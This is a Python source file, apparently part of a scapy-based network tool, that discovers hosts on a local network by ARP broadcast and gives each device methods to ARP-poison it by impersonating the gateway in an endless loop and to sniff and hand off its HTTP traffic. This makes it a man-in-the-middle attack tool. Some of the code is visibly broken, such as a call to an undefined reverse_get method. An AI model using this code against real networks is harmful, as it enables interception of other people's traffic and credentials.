from conf import *
from scapy.all import *
from netaddr import *
from utils import *
from time import sleep
from socket import gethostbyaddr
from functools import partial
from exceptions import *

conf.verb = sr_verbose


class CacheManager:

    def __init__(self):
        self.base = {}

    def __contains__(self, ip):
        return ip in self.base

    def __getitem__(self, key):
        return self.base[key]

    def __setitem__(self, key, value):
        self.base[key] = value

    def __delitem__(self, key, value):
        del self.base[key]

    def __str__(self):
        return str(self.base)

    def inverse_get(self, value):
        for key, val in self.base.items():
            if val == value:
                return key


class Network:

    def __init__(self, iface='en0', discovery_method='ARP'):
        self.iface = iface
        self.arpcache = CacheManager()
        self._this_device = None
        self._gateway = None
        self._network = None
        self.discovery_method = discovery_method

    """
    Resolve IP of the given mac, return
    """
    @staticmethod
    def resolve_ip(mac):
        pass

    @property
    def network(self):
        if not self._network:
            condidate_network = []
            for network, netmask, gw, iface, out in conf.route.routes:
                if iface != self.iface or IPAddress(network) == IPAddress('0.0.0.0') or IPAddress(netmask).is_hostmask():
                    continue
                condidate_network.append((network, netmask))

            default_gateway_ip = IPAddress(self.gateway.ip)
            for network, netmask in condidate_network:
                netmask_len = bin(netmask).count('1')
                condidate_net = "{}/{}".format(IPAddress(network), netmask_len)
                condidate_net = IPNetwork(condidate_net)
                if default_gateway_ip in condidate_net:
                    self._network = condidate_net

        return self._network

    """
    TODO:
    Populate arpcache
    """
    def populate_arpcache(self):
        pass

    """
    ARP Based host discovery
    """
    def arp_discovery(self):
        network = str(self.network)
        alive, dead = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=10)
        for req, res in alive:
            yield Device(ip=res.psrc, mac=res.hwsrc)
            self.arpcache[res.psrc] = res.hwsrc

    """
    Loop over all devices
    Use `discovery_method` to find up hosts
    """
    def __iter__(self):
        if self.discovery_method == 'ARP':
            return self.arp_discovery()

    """
    Resolve device using MAC or IP
    """
    def get_device(self, mac=None, ip=None):
        if mac:
            return self.get_device_by_mac(mac)
        elif ip:
            return self.get_device_by_ip(ip)
        else:
            return self.this_device

    def get_device_by_mac(self, mac):
        return self.arpcache.reverse_get(inverse_get)

    """
    Use ARP who_has request to resolve device by ip
    """
    def get_device_by_ip(self, ip, timeout=10, resolve=False):
        if resolve or ip not in self.arpcache:
            this_dev = self.this_device
            arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            x = srp1(arp, iface=self.iface, timeout=timeout)
            if not x:
                raise DeviceNotFoundException('IP {} not found'.format(ip))
            self.arpcache[ip] = x.hwsrc

        return Device(self.arpcache[ip], ip, self)

    """
    Return the local device
    """
    @property
    def this_device(self, resolve=False):
        if resolve or not self._this_device:
            mac = get_if_hwaddr(self.iface)
            routes = list(filter(lambda r: r[3] == self.iface, conf.route.routes))
            if routes:
                first_route = routes[0]
                ip = first_route[4]
                self._this_device = Device(mac, ip, self)
        return self._this_device

    @property
    def gateway(self):
        if not self._gateway:
            routes = list(filter(lambda r: r[2] != '0.0.0.0' and IPAddress(r[0]) == IPAddress('0.0.0.0'), conf.route.routes))
            if routes:
                first_route = routes[0]
                ip = first_route[2]
                self._gateway = self.get_device(ip=ip)
        return self._gateway

    """
    TODO: Return all devices in network
    """
    def devices(self):
        pass


class Device:

    def __init__(self, mac, ip=None, network=None):
        self.mac = mac
        self.ip = ip
        if not self.ip:
            self.ip = Network.resolve_ip(mac)
        self._name = None
        self.network = network
        self.arp_poisoning = False

    """
    ARP poison the device
    """
    @post_sleep(1)
    @async
    def poison_arp(self, fake_mac=None, spoofed_ip=None, period=3):
        self.arp_poisoning = True
        if not fake_mac:
            fake_mac = self.network.this_device.mac
        if not spoofed_ip:
            spoofed_ip = self.network.gateway.ip

        arp = ARP(op=1, psrc=spoofed_ip, pdst=self.ip, hwdst=fake_mac)
        while True:
            sr1(arp)
            sleep(period)

    """
    Intercept all packets related to the passed event and call the function handler
    """
    @async
    def intercept(self, event, handler):
        if not self.arp_poisoning and self is not self.network.this_device:
            print("Target {} is no poisoned!".format(self))
            return
        packet_filter = event_packet_filter(event, ip=self.ip)
        hanler_fn = partial(handler, self)
        sniff(iface=self.network.iface, lfilter=lambda x: HTTP in x, filter=packet_filter, prn=hanler_fn)

    @property
    def name(self):
        if not self._name:
            if self.mac in known_hosts:
                self._name = known_hosts[self.mac]
            else:
                try:
                    self._name = gethostbyaddr(self.ip)[0]
                except socket.herror:
                    self._name = '<UNKWNOWN>'
        return self._name

    def __str__(self):
        return "Device[mac={} ({}) -- ip={}]".format(self.mac, self.name, self.ip)
